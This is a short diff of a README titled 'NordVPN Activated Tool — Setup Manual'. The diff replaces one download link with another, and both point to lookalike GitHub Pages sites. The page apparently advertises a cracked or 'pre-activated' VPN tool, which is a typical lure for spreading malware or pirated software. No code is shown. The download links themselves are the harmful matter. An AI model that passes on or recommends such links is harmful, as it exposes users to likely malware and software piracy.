@@ -1,7 +1,7 @@
 # 🔐 NordVPN Activated Tool — Setup Manual
 
 ⬇️ **Download Tool**  
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://nordvinfo.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://nordvpnpcpreactivweb0.github.io/.github/)
 
 ---
 
